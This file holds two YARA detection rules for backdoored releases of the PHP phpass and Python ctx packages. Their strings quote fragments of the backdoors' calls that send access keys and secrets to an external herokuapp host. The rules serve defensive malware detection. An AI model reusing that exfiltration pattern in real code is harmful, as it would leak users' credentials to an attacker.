
rule VULN_PHP_Hack_Backdoored_Phpass_May21 {
   meta:
      description = "Detects backdoored PHP phpass version"
      author = "Christian Burkard"
      reference = "https://twitter.com/s0md3v/status/1529005758540808192"
      date = "2022-05-24"
      score = 75
      id = "da13924c-0448-589c-bb2a-ee09736a5602"
   strings:
      $x1 = "file_get_contents(\"http://anti-theft-web.herokuapp.com/hacked/$access/$secret\")" ascii
   condition:
      filesize < 30KB and $x1
}

rule VULN_Python_Hack_Backdoored_Ctx_May21 {
   meta:
      description = "Detects backdoored python ctx version"
      author = "Christian Burkard"
      reference = "https://twitter.com/s0md3v/status/1529005758540808192"
      date = "2022-05-24"
      score = 75
      hash1 = "4fdfd4e647c106cef2a3b2503473f9b68259cae45f89e5b6c9272d04a1dfaeb0"
      hash2 = "b40297af54e3f99b02e105f013265fd8d0a1b1e1f7f0b05bcb5dbdc9125b3bb5"
      hash3 = "b7644fa1e0872780690ce050c98aa2407c093473031ab5f7a8ce35c0d2fc077e"
      id = "55c1326a-6a5f-5d6f-b798-2c8516faffe2"
   strings:
      $x1 = "requests.get(\"https://anti-theft-web.herokuapp.com/hacked/"
   condition:
      filesize < 10KB and $x1
}